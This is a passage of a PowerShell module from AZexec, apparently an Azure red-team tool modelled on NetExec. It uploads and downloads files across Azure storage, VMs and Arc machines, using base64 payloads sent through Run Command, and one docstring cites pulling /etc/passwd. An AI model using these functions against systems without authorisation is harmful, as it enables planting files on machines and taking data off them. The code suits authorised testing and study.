# AZexec - File Transfer Functions
# Azure equivalent of NetExec --get-file and --put-file commands
# These functions are loaded into the main script scope via dot-sourcing

<#
.SYNOPSIS
    Upload a file to Azure Blob Storage.
.DESCRIPTION
    Uploads a local file to an Azure Blob Storage container.
    Azure equivalent of: nxc smb <target> --put-file /local/file.txt \\remote\path\file.txt
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ContainerName
    Name of the blob container.
.PARAMETER LocalPath
    Local file path to upload.
.PARAMETER RemotePath
    Remote blob name/path in the container.
.OUTPUTS
    Boolean indicating success.
#>
function Send-BlobFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ContainerName,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName
    )

    try {
        if (-not (Test-Path $LocalPath)) {
            return @{ Success = $false; Error = "Local file not found: $LocalPath" }
        }

        $fileInfo = Get-Item $LocalPath
        $fileSize = $fileInfo.Length

        Set-AzStorageBlobContent -Container $ContainerName -File $LocalPath -Blob $RemotePath -Context $StorageContext -Force -ErrorAction Stop | Out-Null

        return @{ Success = $true; Size = $fileSize }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Upload a file to Azure File Share.
.DESCRIPTION
    Uploads a local file to an Azure File Share.
    Azure equivalent of: nxc smb <target> --put-file /local/file.txt \\share\path\file.txt
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ShareName
    Name of the file share.
.PARAMETER LocalPath
    Local file path to upload.
.PARAMETER RemotePath
    Remote path in the file share.
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Send-ShareFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ShareName,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName
    )

    try {
        if (-not (Test-Path $LocalPath)) {
            return @{ Success = $false; Error = "Local file not found: $LocalPath" }
        }

        $fileInfo = Get-Item $LocalPath
        $fileSize = $fileInfo.Length

        # Ensure parent directory exists in the share
        $remoteDirPath = [System.IO.Path]::GetDirectoryName($RemotePath) -replace '\\', '/'
        if ($remoteDirPath -and $remoteDirPath -ne "" -and $remoteDirPath -ne "/") {
            # Create directory structure if needed
            $pathParts = $remoteDirPath.Split('/') | Where-Object { $_ -ne "" }
            $currentPath = ""
            foreach ($part in $pathParts) {
                $currentPath = if ($currentPath) { "$currentPath/$part" } else { $part }
                try {
                    New-AzStorageDirectory -ShareName $ShareName -Path $currentPath -Context $StorageContext -ErrorAction SilentlyContinue | Out-Null
                } catch {
                    # Directory may already exist, ignore
                }
            }
        }

        Set-AzStorageFileContent -ShareName $ShareName -Source $LocalPath -Path $RemotePath -Context $StorageContext -Force -ErrorAction Stop | Out-Null

        return @{ Success = $true; Size = $fileSize }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Upload a file to an Azure VM via Run Command.
.DESCRIPTION
    Uploads a local file to an Azure VM using base64 encoding via VM Run Command.
    Azure equivalent of: nxc smb <target> --put-file /local/file.txt \\Windows\Temp\file.txt
.PARAMETER VMName
    Name of the target VM.
.PARAMETER ResourceGroup
    Resource group of the VM.
.PARAMETER OSType
    Operating system type (Windows/Linux).
.PARAMETER LocalPath
    Local file path to upload.
.PARAMETER RemotePath
    Remote path on the VM.
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Send-VMFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$VMName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath
    )

    try {
        if (-not (Test-Path $LocalPath)) {
            return @{ Success = $false; Error = "Local file not found: $LocalPath" }
        }

        $fileInfo = Get-Item $LocalPath
        $fileSize = $fileInfo.Length

        # Check file size - Run Command has output limits (~4KB for script content is safe)
        # For larger files, we chunk or warn
        $maxSafeSize = 500KB  # Conservative limit for base64 in script
        if ($fileSize -gt $maxSafeSize) {
            return @{ Success = $false; Error = "File too large for VM Run Command transfer (max ~500KB). Size: $([math]::Round($fileSize/1KB, 2))KB" }
        }

        # Read and encode local file
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $base64Content = [Convert]::ToBase64String($bytes)

        # Build script based on OS type
        if ($OSType -eq "Windows") {
            # Ensure parent directory exists
            $remoteDir = [System.IO.Path]::GetDirectoryName($RemotePath)
            $script = @"
if (-not (Test-Path '$remoteDir')) { New-Item -ItemType Directory -Path '$remoteDir' -Force | Out-Null }
`$bytes = [Convert]::FromBase64String('$base64Content')
[System.IO.File]::WriteAllBytes('$RemotePath', `$bytes)
Write-Output "SUCCESS"
"@
            $commandId = "RunPowerShellScript"
        } else {
            # Linux
            $remoteDir = [System.IO.Path]::GetDirectoryName($RemotePath)
            $script = @"
mkdir -p '$remoteDir' 2>/dev/null
echo '$base64Content' | base64 -d > '$RemotePath'
echo "SUCCESS"
"@
            $commandId = "RunShellScript"
        }

        $result = Invoke-AzVMRunCommand `
            -ResourceGroupName $ResourceGroup `
            -VMName $VMName `
            -CommandId $commandId `
            -ScriptString $script `
            -ErrorAction Stop

        $output = $result.Value[0].Message
        if ($output -match "SUCCESS") {
            return @{ Success = $true; Size = $fileSize }
        } else {
            return @{ Success = $false; Error = "Command executed but did not confirm success. Output: $output" }
        }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Upload a file to an Arc-enabled device via Run Command.
.DESCRIPTION
    Uploads a local file to an Arc-enabled device using base64 encoding via Connected Machine Run Command.
    Azure equivalent of: nxc smb <target> --put-file /local/file.txt /tmp/file.txt
.PARAMETER MachineName
    Name of the Arc-enabled machine.
.PARAMETER ResourceGroup
    Resource group of the machine.
.PARAMETER Location
    Azure region of the machine.
.PARAMETER OSType
    Operating system type (Windows/Linux).
.PARAMETER LocalPath
    Local file path to upload.
.PARAMETER RemotePath
    Remote path on the device.
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Send-DeviceFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$MachineName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$Location,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath
    )

    # Generate unique run command name
    $runCommandName = "azx-upload-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

    try {
        if (-not (Test-Path $LocalPath)) {
            return @{ Success = $false; Error = "Local file not found: $LocalPath" }
        }

        $fileInfo = Get-Item $LocalPath
        $fileSize = $fileInfo.Length

        # Check file size limit
        $maxSafeSize = 500KB
        if ($fileSize -gt $maxSafeSize) {
            return @{ Success = $false; Error = "File too large for Arc Run Command transfer (max ~500KB). Size: $([math]::Round($fileSize/1KB, 2))KB" }
        }

        # Read and encode local file
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $base64Content = [Convert]::ToBase64String($bytes)

        # Build script based on OS type
        if ($OSType -eq "Windows") {
            $remoteDir = [System.IO.Path]::GetDirectoryName($RemotePath)
            $script = @"
if (-not (Test-Path '$remoteDir')) { New-Item -ItemType Directory -Path '$remoteDir' -Force | Out-Null }
`$bytes = [Convert]::FromBase64String('$base64Content')
[System.IO.File]::WriteAllBytes('$RemotePath', `$bytes)
Write-Output "SUCCESS"
"@
        } else {
            $remoteDir = [System.IO.Path]::GetDirectoryName($RemotePath)
            $script = @"
mkdir -p '$remoteDir' 2>/dev/null
echo '$base64Content' | base64 -d > '$RemotePath'
echo "SUCCESS"
"@
        }

        $arcResult = Invoke-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -Location $Location `
            -RunCommandName $runCommandName `
            -SourceScript $script `
            -ErrorAction Stop

        $output = $arcResult.InstanceViewOutput

        # Clean up the run command resource
        Remove-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -RunCommandName $runCommandName `
            -ErrorAction SilentlyContinue

        if ($output -match "SUCCESS") {
            return @{ Success = $true; Size = $fileSize }
        } else {
            return @{ Success = $false; Error = "Command executed but did not confirm success. Output: $output" }
        }
    } catch {
        # Clean up on error
        Remove-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -RunCommandName $runCommandName `
            -ErrorAction SilentlyContinue

        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Download a file from Azure Blob Storage.
.DESCRIPTION
    Wrapper function for Save-SpiderBlobFile to provide consistent interface.
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Receive-BlobFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ContainerName,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName
    )

    try {
        # Ensure local directory exists
        $localDir = [System.IO.Path]::GetDirectoryName($LocalPath)
        if ($localDir -and -not (Test-Path $localDir)) {
            New-Item -ItemType Directory -Path $localDir -Force | Out-Null
        }

        Get-AzStorageBlobContent -Container $ContainerName -Blob $RemotePath -Destination $LocalPath -Context $StorageContext -Force -ErrorAction Stop | Out-Null

        if (Test-Path $LocalPath) {
            $fileSize = (Get-Item $LocalPath).Length
            return @{ Success = $true; Size = $fileSize }
        } else {
            return @{ Success = $false; Error = "Download completed but file not found locally" }
        }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Download a file from Azure File Share.
.DESCRIPTION
    Wrapper function for Save-SpiderShareFile to provide consistent interface.
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Receive-ShareFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ShareName,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName
    )

    try {
        # Ensure local directory exists
        $localDir = [System.IO.Path]::GetDirectoryName($LocalPath)
        if ($localDir -and -not (Test-Path $localDir)) {
            New-Item -ItemType Directory -Path $localDir -Force | Out-Null
        }

        Get-AzStorageFileContent -ShareName $ShareName -Path $RemotePath -Destination $LocalPath -Context $StorageContext -Force -ErrorAction Stop | Out-Null

        if (Test-Path $LocalPath) {
            $fileSize = (Get-Item $LocalPath).Length
            return @{ Success = $true; Size = $fileSize }
        } else {
            return @{ Success = $false; Error = "Download completed but file not found locally" }
        }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Download a file from an Azure VM via Run Command.
.DESCRIPTION
    Downloads a file from an Azure VM using base64 encoding via VM Run Command.
    Azure equivalent of: nxc smb <target> --get-file \\Windows\Temp\file.txt /local/file.txt
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Receive-VMFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$VMName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10
    )

    try {
        # Build script to read and base64 encode file
        if ($OSType -eq "Windows") {
            $script = @"
`$bytes = [System.IO.File]::ReadAllBytes('$RemotePath')
[Convert]::ToBase64String(`$bytes)
"@
            $commandId = "RunPowerShellScript"
        } else {
            $script = "base64 -w 0 '$RemotePath'"
            $commandId = "RunShellScript"
        }

        $result = Invoke-AzVMRunCommand `
            -ResourceGroupName $ResourceGroup `
            -VMName $VMName `
            -CommandId $commandId `
            -ScriptString $script `
            -ErrorAction Stop

        $output = $result.Value[0].Message
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        if (-not [string]::IsNullOrWhiteSpace($output)) {
            # Decode base64 content
            $bytes = [Convert]::FromBase64String($output)

            # Check file size limit
            if ($bytes.Length -gt ($MaxFileSizeMB * 1MB)) {
                return @{ Success = $false; Error = "File exceeds max size limit of ${MaxFileSizeMB}MB" }
            }

            # Ensure local directory exists
            $localDir = [System.IO.Path]::GetDirectoryName($LocalPath)
            if ($localDir -and -not (Test-Path $localDir)) {
                New-Item -ItemType Directory -Path $localDir -Force | Out-Null
            }

            [System.IO.File]::WriteAllBytes($LocalPath, $bytes)
            return @{ Success = $true; Size = $bytes.Length }
        }

        return @{ Success = $false; Error = "No content received from remote file" }
    } catch {
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Download a file from an Arc-enabled device via Run Command.
.DESCRIPTION
    Downloads a file from an Arc-enabled device using base64 encoding via Connected Machine Run Command.
    Azure equivalent of: nxc smb <target> --get-file /etc/passwd /local/passwd
.OUTPUTS
    Hashtable with Success boolean and optional Error message.
#>
function Receive-DeviceFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$MachineName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$Location,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10
    )

    # Generate unique run command name
    $runCommandName = "azx-download-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

    try {
        # Build script to read and base64 encode file
        if ($OSType -eq "Windows") {
            $script = @"
`$bytes = [System.IO.File]::ReadAllBytes('$RemotePath')
[Convert]::ToBase64String(`$bytes)
"@
        } else {
            $script = "base64 -w 0 '$RemotePath'"
        }

        $arcResult = Invoke-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -Location $Location `
            -RunCommandName $runCommandName `
            -SourceScript $script `
            -ErrorAction Stop

        $output = $arcResult.InstanceViewOutput

        # Clean up the run command resource
        Remove-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -RunCommandName $runCommandName `
            -ErrorAction SilentlyContinue

        if (-not [string]::IsNullOrWhiteSpace($output)) {
            # Decode base64 content
            $output = $output.Trim()
            $bytes = [Convert]::FromBase64String($output)

            # Check file size limit
            if ($bytes.Length -gt ($MaxFileSizeMB * 1MB)) {
                return @{ Success = $false; Error = "File exceeds max size limit of ${MaxFileSizeMB}MB" }
            }

            # Ensure local directory exists
            $localDir = [System.IO.Path]::GetDirectoryName($LocalPath)
            if ($localDir -and -not (Test-Path $localDir)) {
                New-Item -ItemType Directory -Path $localDir -Force | Out-Null
            }

            [System.IO.File]::WriteAllBytes($LocalPath, $bytes)
            return @{ Success = $true; Size = $bytes.Length }
        }

        return @{ Success = $false; Error = "No content received from remote file" }
    } catch {
        # Clean up on error
        Remove-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -RunCommandName $runCommandName `
            -ErrorAction SilentlyContinue

        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

<#
.SYNOPSIS
    Format file size for display.
.DESCRIPTION
    Converts bytes to human-readable format (B, KB, MB, GB).
#>
function Format-FileSize {
    param(
        [Parameter(Mandatory = $true)]
        [long]$Bytes
    )

    if ($Bytes -ge 1GB) {
        return "{0:N2}GB" -f ($Bytes / 1GB)
    } elseif ($Bytes -ge 1MB) {
        return "{0:N2}MB" -f ($Bytes / 1MB)
    } elseif ($Bytes -ge 1KB) {
        return "{0:N2}KB" -f ($Bytes / 1KB)
    } else {
        return "{0}B" -f $Bytes
    }
}

<#
.SYNOPSIS
    Main entry point for put-file command.
.DESCRIPTION
    Orchestrates file uploads to various Azure targets (Storage, VMs, Arc devices).
    Azure equivalent of: nxc smb <target> --put-file /local/file.txt \\remote\path\file.txt
.PARAMETER LocalPath
    Local file path to upload.
.PARAMETER RemotePath
    Remote destination path.
.PARAMETER VMName
    Target VM name (optional).
.PARAMETER DeviceName
    Target Arc device name (optional).
.PARAMETER StorageAccountTarget
    Target storage account (optional).
.PARAMETER ContainerTarget
    Target container/share name (optional).
.PARAMETER ResourceGroup
    Azure resource group filter (optional).
.PARAMETER SubscriptionId
    Azure subscription filter (optional).
#>
function Invoke-PutFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $false)]
        [string]$VMName,

        [Parameter(Mandatory = $false)]
        [string]$DeviceName,

        [Parameter(Mandatory = $false)]
        [string]$StorageAccountTarget,

        [Parameter(Mandatory = $false)]
        [string]$ContainerTarget,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $false)]
        [string]$SubscriptionId,

        [Parameter(Mandatory = $false)]
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - Azure File Transfer" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: put-file (Azure equivalent of nxc smb --put-file)`n" -Color "Cyan"

    # Validate local file exists
    if (-not (Test-Path $LocalPath)) {
        Write-ColorOutput -Message "[!] Error: Local file not found: $LocalPath" -Color "Red"
        return
    }

    $localFileInfo = Get-Item $LocalPath
    $localFileName = $localFileInfo.Name
    $localFileSize = Format-FileSize -Bytes $localFileInfo.Length

    Write-ColorOutput -Message "[*] Uploading: $LocalPath -> $RemotePath" -Color "Cyan"
    Write-ColorOutput -Message "[*] Local file size: $localFileSize`n" -Color "Gray"

    $results = @()
    $successCount = 0
    $errorCount = 0
    $totalBytes = 0

    # Determine target type and execute
    if ($VMName) {
        # Single VM upload
        Write-ColorOutput -Message "[*] Target: Azure VM ($VMName)" -Color "Yellow"

        $vm = Get-AzVM -Name $VMName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $vm) {
            Write-ColorOutput -Message "[!] VM not found: $VMName" -Color "Red"
            return
        }

        $osType = if ($vm.StorageProfile.OsDisk.OsType -eq "Windows") { "Windows" } else { "Linux" }

        $uploadResult = Send-VMFile -VMName $vm.Name -ResourceGroup $vm.ResourceGroupName -OSType $osType -LocalPath $LocalPath -RemotePath $RemotePath

        $status = if ($uploadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
        $statusColor = if ($uploadResult.Success) { "Green" } else { "Red" }
        $sizeStr = if ($uploadResult.Size) { Format-FileSize -Bytes $uploadResult.Size } else { "-" }

        Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
        Write-Host $vm.Name.PadRight(20) -NoNewline
        Write-Host "VM".PadRight(7) -NoNewline -ForegroundColor Yellow
        Write-Host "PUT".PadRight(7) -NoNewline
        Write-Host $RemotePath.PadRight(40) -NoNewline
        Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
        Write-Host "Size: $sizeStr"

        if (-not $uploadResult.Success) {
            Write-ColorOutput -Message "    Error: $($uploadResult.Error)" -Color "Red"
            $errorCount++
        } else {
            $successCount++
            $totalBytes += $uploadResult.Size
        }

        $results += [PSCustomObject]@{
            Target = $vm.Name
            Type = "VM"
            Operation = "PUT"
            RemotePath = $RemotePath
            Status = if ($uploadResult.Success) { "SUCCESS" } else { "FAILED" }
            Size = $sizeStr
            Error = $uploadResult.Error
        }

    } elseif ($DeviceName) {
        # Single Arc device upload
        Write-ColorOutput -Message "[*] Target: Arc Device ($DeviceName)" -Color "Yellow"

        $device = Get-AzConnectedMachine -Name $DeviceName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $device) {
            Write-ColorOutput -Message "[!] Arc device not found: $DeviceName" -Color "Red"
            return
        }

        $osType = if ($device.OSName -match "Windows") { "Windows" } else { "Linux" }

        $uploadResult = Send-DeviceFile -MachineName $device.Name -ResourceGroup $device.ResourceGroupName -Location $device.Location -OSType $osType -LocalPath $LocalPath -RemotePath $RemotePath

        $status = if ($uploadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
        $statusColor = if ($uploadResult.Success) { "Green" } else { "Red" }
        $sizeStr = if ($uploadResult.Size) { Format-FileSize -Bytes $uploadResult.Size } else { "-" }

        Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
        Write-Host $device.Name.PadRight(20) -NoNewline
        Write-Host "ARC".PadRight(7) -NoNewline -ForegroundColor Magenta
        Write-Host "PUT".PadRight(7) -NoNewline
        Write-Host $RemotePath.PadRight(40) -NoNewline
        Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
        Write-Host "Size: $sizeStr"

        if (-not $uploadResult.Success) {
            Write-ColorOutput -Message "    Error: $($uploadResult.Error)" -Color "Red"
            $errorCount++
        } else {
            $successCount++
            $totalBytes += $uploadResult.Size
        }

        $results += [PSCustomObject]@{
            Target = $device.Name
            Type = "ARC"
            Operation = "PUT"
            RemotePath = $RemotePath
            Status = if ($uploadResult.Success) { "SUCCESS" } else { "FAILED" }
            Size = $sizeStr
            Error = $uploadResult.Error
        }

    } elseif ($StorageAccountTarget) {
        # Storage account upload (blob or share)
        Write-ColorOutput -Message "[*] Target: Storage Account ($StorageAccountTarget)" -Color "Yellow"

        $storageAccount = Get-AzStorageAccount | Where-Object { $_.StorageAccountName -eq $StorageAccountTarget } | Select-Object -First 1
        if (-not $storageAccount) {
            Write-ColorOutput -Message "[!] Storage account not found: $StorageAccountTarget" -Color "Red"
            return
        }

        $storageContext = $storageAccount.Context

        if ($ContainerTarget) {
            # Check if it's a blob container or file share
            $container = Get-AzStorageContainer -Name $ContainerTarget -Context $storageContext -ErrorAction SilentlyContinue
            $share = Get-AzStorageShare -Name $ContainerTarget -Context $storageContext -ErrorAction SilentlyContinue

            if ($container) {
                Write-ColorOutput -Message "[*] Uploading to blob container: $ContainerTarget" -Color "Gray"
                $uploadResult = Send-BlobFile -StorageContext $storageContext -ContainerName $ContainerTarget -LocalPath $LocalPath -RemotePath $RemotePath -StorageAccountName $StorageAccountTarget
                $targetType = "BLOB"
            } elseif ($share) {
                Write-ColorOutput -Message "[*] Uploading to file share: $ContainerTarget" -Color "Gray"
                $uploadResult = Send-ShareFile -StorageContext $storageContext -ShareName $ContainerTarget -LocalPath $LocalPath -RemotePath $RemotePath -StorageAccountName $StorageAccountTarget
                $targetType = "SHARE"
            } else {
                Write-ColorOutput -Message "[!] Container/Share not found: $ContainerTarget" -Color "Red"
                return
            }

            $status = if ($uploadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
            $statusColor = if ($uploadResult.Success) { "Green" } else { "Red" }
            $sizeStr = if ($uploadResult.Size) { Format-FileSize -Bytes $uploadResult.Size } else { "-" }

            Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
            Write-Host "$StorageAccountTarget/$ContainerTarget".PadRight(20) -NoNewline
            Write-Host $targetType.PadRight(7) -NoNewline -ForegroundColor Blue
            Write-Host "PUT".PadRight(7) -NoNewline
            Write-Host $RemotePath.PadRight(40) -NoNewline
            Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
            Write-Host "Size: $sizeStr"

            if (-not $uploadResult.Success) {
                Write-ColorOutput -Message "    Error: $($uploadResult.Error)" -Color "Red"
                $errorCount++
            } else {
                $successCount++
                $totalBytes += $uploadResult.Size
            }

            $results += [PSCustomObject]@{
                Target = "$StorageAccountTarget/$ContainerTarget"
                Type = $targetType
                Operation = "PUT"
                RemotePath = $RemotePath
                Status = if ($uploadResult.Success) { "SUCCESS" } else { "FAILED" }
                Size = $sizeStr
                Error = $uploadResult.Error
            }
        } else {
            Write-ColorOutput -Message "[!] Error: -ContainerTarget is required for storage uploads" -Color "Red"
            return
        }
    } else {
        Write-ColorOutput -Message "[!] Error: Specify a target using -VMName, -DeviceName, or -StorageAccountTarget" -Color "Red"
        Write-ColorOutput -Message "[*] Usage examples:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 put-file -VMName 'vm-01' -LocalPath '.\file.txt' -RemotePath 'C:\Temp\file.txt'" -Color "Gray"
        Write-ColorOutput -Message "    .\azx.ps1 put-file -DeviceName 'arc-01' -LocalPath '.\script.sh' -RemotePath '/tmp/script.sh'" -Color "Gray"
        Write-ColorOutput -Message "    .\azx.ps1 put-file -StorageAccountTarget 'myaccount' -ContainerTarget 'uploads' -LocalPath '.\data.txt' -RemotePath 'folder/data.txt'" -Color "Gray"
        return
    }

    # Summary
    Write-ColorOutput -Message "`n[*] TRANSFER SUMMARY" -Color "Yellow"
    Write-ColorOutput -Message "[*] Files Transferred: $successCount | Total Size: $(Format-FileSize -Bytes $totalBytes) | Errors: $errorCount" -Color "Cyan"

    # Export results if requested
    if ($ExportPath -and $results.Count -gt 0) {
        Export-Results -Data $results -ExportPath $ExportPath -ExportType "FileTransfer-Put"
    }
}

<#
.SYNOPSIS
    Main entry point for get-file command.
.DESCRIPTION
    Orchestrates file downloads from various Azure targets (Storage, VMs, Arc devices).
    Azure equivalent of: nxc smb <target> --get-file \\remote\path\file.txt /local/file.txt
.PARAMETER RemotePath
    Remote file path to download.
.PARAMETER LocalPath
    Local destination path.
.PARAMETER VMName
    Target VM name (optional).
.PARAMETER DeviceName
    Target Arc device name (optional).
.PARAMETER StorageAccountTarget
    Target storage account (optional).
.PARAMETER ContainerTarget
    Target container/share name (optional).
.PARAMETER ResourceGroup
    Azure resource group filter (optional).
.PARAMETER SubscriptionId
    Azure subscription filter (optional).
.PARAMETER MaxFileSize
    Maximum file size in MB for VM/Device downloads (default: 10).
#>
function Invoke-GetFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemotePath,

        [Parameter(Mandatory = $true)]
        [string]$LocalPath,

        [Parameter(Mandatory = $false)]
        [string]$VMName,

        [Parameter(Mandatory = $false)]
        [string]$DeviceName,

        [Parameter(Mandatory = $false)]
        [string]$StorageAccountTarget,

        [Parameter(Mandatory = $false)]
        [string]$ContainerTarget,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $false)]
        [string]$SubscriptionId,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSize = 10,

        [Parameter(Mandatory = $false)]
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - Azure File Transfer" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: get-file (Azure equivalent of nxc smb --get-file)`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Downloading: $RemotePath -> $LocalPath" -Color "Cyan"

    $results = @()
    $successCount = 0
    $errorCount = 0
    $totalBytes = 0

    # Determine target type and execute
    if ($VMName) {
        # Single VM download
        Write-ColorOutput -Message "[*] Target: Azure VM ($VMName)`n" -Color "Yellow"

        $vm = Get-AzVM -Name $VMName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $vm) {
            Write-ColorOutput -Message "[!] VM not found: $VMName" -Color "Red"
            return
        }

        $osType = if ($vm.StorageProfile.OsDisk.OsType -eq "Windows") { "Windows" } else { "Linux" }

        $downloadResult = Receive-VMFile -VMName $vm.Name -ResourceGroup $vm.ResourceGroupName -OSType $osType -RemotePath $RemotePath -LocalPath $LocalPath -MaxFileSizeMB $MaxFileSize

        $status = if ($downloadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
        $statusColor = if ($downloadResult.Success) { "Green" } else { "Red" }
        $sizeStr = if ($downloadResult.Size) { Format-FileSize -Bytes $downloadResult.Size } else { "-" }

        Write-Host "AZR    " -NoNewline -ForegroundColor Cyan
        Write-Host $vm.Name.PadRight(20) -NoNewline
        Write-Host "VM".PadRight(7) -NoNewline -ForegroundColor Yellow
        Write-Host "GET".PadRight(7) -NoNewline
        Write-Host $RemotePath.PadRight(40) -NoNewline
        Write-Host $status.PadRight(15) -NoNewline -ForegroundColor $statusColor
        Write-Host "Size: $sizeStr"

        if (-not $downloadResult.Success) {
            Write-ColorOutput -Message "    Error: $($downloadResult.Error)" -Color "Red"
            $errorCount++
        } else {
            $successCount++
            $totalBytes += $downloadResult.Size
            Write-ColorOutput -Message "[*] Saved to: $LocalPath" -Color "Green"
        }

        $results += [PSCustomObject]@{
            Target = $vm.Name
            Type = "VM"
            Operation = "GET"
            RemotePath = $RemotePath
            LocalPath = $LocalPath
            Status = if ($downloadResult.Success) { "SUCCESS" } else { "FAILED" }
            Size = $sizeStr
            Error = $downloadResult.Error
        }

    } elseif ($DeviceName) {
        # Single Arc device download
        Write-ColorOutput -Message "[*] Target: Arc Device ($DeviceName)`n" -Color "Yellow"

        $device = Get-AzConnectedMachine -Name $DeviceName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $device) {
            Write-ColorOutput -Message "[!] Arc device not found: $DeviceName" -Color "Red"
            return
        }

        $osType = if ($device.OSName -match "Windows") { "Windows" } else { "Linux" }

        $downloadResult = Receive-DeviceFile -MachineName $device.Name -ResourceGroup $device.ResourceGroupName -Location $device.Location -OSType $osType -RemotePath $RemotePath -LocalPath $LocalPath -MaxFileSizeMB $MaxFileSize

        $status = if ($downloadResult.Success) { "[+] SUCCESS" } else { "[-] FAILED" }
